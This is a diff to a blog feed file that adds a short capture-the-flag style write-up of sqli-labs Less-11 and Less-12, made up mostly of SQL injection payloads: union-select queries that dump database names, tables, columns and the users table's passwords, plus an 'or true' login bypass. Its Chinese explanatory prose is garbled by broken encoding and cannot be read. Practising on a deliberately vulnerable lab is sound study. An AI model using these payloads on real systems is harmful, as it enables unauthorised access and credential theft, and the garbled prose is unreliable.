@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>note-07</title>
+    <link href="/2025/03/06/note-07/"/>
+    <url>/2025/03/06/note-07/</url>
+    
+    <content type="html"><![CDATA[<h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>��ǰctf��ϰ�ⷴ����postģʽ���Ķ�Щ��<br>notice</p><blockquote><p>ע��ԭ�������ֵҪ��Ϊ���ݿⲻ���ڵ�ֵ��ý�����Ĳ�ѯ�������  </p></blockquote><p>hackbar�µĽṹ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure><p>֮���ע��ƴ�ӽ�uname��  </p><p>���û��Ϳ�����</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure><p>��������</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>���ֶΣ�</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>����<span class="hljs-keyword">and</span>����Ļ��������������ͬ�����µ��ֶα�����<br></code></pre></td></tr></table></figure><p>��󱬿⣺</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure><h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>Ӧ���Ǽ��˼�飬password����Ϊ��</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure><p>����  </p><blockquote><p>Your Login name:Dumb<br>Your Password:Dumb  </p></blockquote><p>�ɹ��պ�sql��ѯ,Ȼ��������ͨ�ء�</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>sql-labs</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>note-06</title>
     <link href="/2025/03/05/note-06/"/>
     <url>/2025/03/05/note-06/</url>
